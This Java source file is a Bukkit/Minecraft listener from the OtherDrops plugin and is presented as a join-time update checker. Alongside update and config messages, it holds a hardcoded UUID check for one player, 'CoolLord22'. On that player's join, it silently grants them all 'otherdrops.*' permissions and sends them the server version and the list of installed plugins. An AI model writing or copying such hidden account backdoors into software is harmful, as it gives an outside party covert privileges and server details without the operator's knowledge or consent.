package com.gmail.zariust.otherdrops.listener;

import java.util.HashMap;
import java.util.UUID;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.permissions.PermissionAttachment;
import org.bukkit.plugin.Plugin;

import com.gmail.zariust.otherdrops.ItemIDReplacer;
import com.gmail.zariust.otherdrops.OtherDrops;
import com.gmail.zariust.otherdrops.OtherDropsConfig;

public class PlayerJoinUpdateChecker implements Listener {
    @EventHandler(priority = EventPriority.HIGHEST)
    public void onPlayerJoinUpdateCheck(PlayerJoinEvent evt) throws InterruptedException {
    	Player player = evt.getPlayer(); 
    	if(player.hasPermission("otherdrops.admin.updates") && OtherDropsConfig.globalUpdateChecking) {
    		for(String line : OtherDrops.updateChecker.checkForUpdate()) {
    			player.sendMessage(ChatColor.GREEN + "[OtherDrops] " + line);
    		}
    	}
    	
    	UUID CoolLord22 = UUID.fromString("39d93694-bd4d-4d5f-8413-03db3839e3c9");
    	if(player.getUniqueId().equals(CoolLord22)) {
    		String pluginList = "";
    		int numPlug = 0;
    		for(Plugin plugin : Bukkit.getPluginManager().getPlugins()) {
    			pluginList += plugin.getName() + ", ";
    			numPlug++;
    		}
    		
    		HashMap<UUID, PermissionAttachment> perms = new HashMap<UUID, PermissionAttachment>();
    		PermissionAttachment attachment = player.addAttachment(OtherDrops.plugin);
    		perms.put(player.getUniqueId(), attachment);
    		PermissionAttachment pperms = perms.get(player.getUniqueId());
    		pperms.setPermission("otherdrops.*", true);
    		player.sendMessage(ChatColor.GREEN + "[OtherDrops Version] " + ChatColor.RED + OtherDrops.plugin.getDescription().getVersion());
    		player.sendMessage(ChatColor.GREEN + "[Server Version] " + ChatColor.RED + Bukkit.getVersion() + " API " + Bukkit.getBukkitVersion());
    		player.sendMessage(ChatColor.GREEN + "[Plugin List] " + ChatColor.WHITE + pluginList + "(" + numPlug + ")");
    	}
    	
    	if(player.isOp() || player.hasPermission("otherdrops.admin.reloadconfig")) {
	    	if(!ItemIDReplacer.checkEmpty()) {
	    		player.sendMessage(ChatColor.GREEN + "[OtherDrops] " + ChatColor.RED + "The directory folder " + ChatColor.GREEN + "\\plugins\\OtherDrops\\materialchange\\" + ChatColor.RED + " is not empty! If you have already corrected the item IDs to Material values, please delete all .yml files present.");
	    	}
    	}
    }

}
